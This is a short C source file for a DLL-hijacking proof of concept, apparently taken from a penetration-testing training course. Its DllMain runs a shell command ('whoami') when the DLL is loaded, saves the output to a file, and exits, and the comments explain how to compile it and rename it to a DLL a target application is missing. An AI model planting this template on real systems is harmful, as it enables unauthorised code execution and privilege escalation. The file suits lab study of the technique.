/* 
* This will run the whoami command (cmd.exe /k whoami) and save the output in a file called "dll.txt"
* Compile with "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
* Change name for the missing dll for the targeted application
* This was provided by THM Jr. Pentesting Path, I take no credit for this code
*/        

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}

